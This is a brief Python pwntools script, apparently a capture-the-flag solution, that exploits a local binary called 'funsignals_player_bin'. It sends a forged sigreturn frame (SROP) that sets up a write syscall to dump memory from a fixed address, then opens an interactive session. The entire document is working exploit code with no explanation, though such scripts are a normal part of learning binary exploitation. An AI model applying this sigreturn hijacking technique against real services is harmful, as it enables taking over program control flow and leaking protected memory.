from pwn import *

context.arch = "amd64"

target = process("./funsignals_player_bin")

frame = SigreturnFrame()

frame.rax = 0x1
frame.rdi = 0x1
frame.rsi = 0x10000023
frame.rdx = 0x400
frame.rip = 0x1000000b


target.send(bytes(frame))


target.interactive()